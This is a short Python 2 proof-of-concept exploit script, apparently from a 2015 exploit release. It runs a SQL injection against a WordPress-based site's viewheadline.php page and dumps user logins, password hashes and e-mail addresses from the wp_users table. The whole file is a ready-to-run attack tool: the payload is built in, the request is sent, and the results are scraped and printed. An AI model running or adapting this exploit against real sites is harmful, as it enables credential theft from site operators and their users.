 from sys import argv, exit																					  
 from urllib import urlopen																					  
 from re import findall																			                  
																								  
 if len(argv) < 2:																						  
	exit('Usage: python file.py http://vulnsite.com/path/')																	  
																								  
 print "\n// P0ISON.ORG // POC // 17/1/2015 // \n\n"																	          
																							          
 payload = 'viewheadline.php?id=-9%27%20union%20select%201,2,3,4,5,concat(user_login,0x3a,user_pass,0x3a,user_email),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from wp_users--+'         
																								  
 arg = argv[1]																						  
																								  
 if arg[0:7] != "http://":																					  
		url = "http://" + str(arg)                                                                                                                                                        
 else:      																					                  
	url = arg																						  
																								  
 data = urlopen(url + str(payload)).read()																			  
																								  
 matches = findall(r"<span class=\"newstitle\">(.*?)</span>", data)																  
																								  
 for match in matches:																					  
	x = match.split(":")																					  
	print "User: " + str(x[0]) + " | Password: " + str(x[1]) + " | E-mail: " + str(x[2]) + "\n"